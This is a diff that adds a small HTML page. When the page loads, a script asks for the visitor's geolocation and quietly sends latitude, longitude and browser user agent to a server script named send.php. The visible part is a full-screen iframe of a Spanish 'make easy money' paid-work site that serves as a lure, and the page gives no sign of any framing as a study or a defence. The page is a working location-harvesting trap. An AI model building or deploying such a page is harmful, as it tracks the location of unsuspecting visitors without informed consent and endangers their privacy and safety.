@@ -1,0 +1,19 @@
+<html>
+<body onload="getLocation()">
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  }
+}
+
+function showPosition(position) {
+  const xhttp = new XMLHttpRequest();
+  xhttp.open("GET", "send.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&agent=" + navigator.userAgent )
+  xhttp.send();
+}
+</script>
+   <iframe src="https://www.paidwork.com/?lang=es" width="2000" height="2000" frameBorder="0" class="GANA DINERO PACIL" allowFullScreen></iframe><p><a href="hhttps://www.paidwork.com/GANADINERO>via GANA DINERO FACIL</a></p>
+</body>
+</html>
+
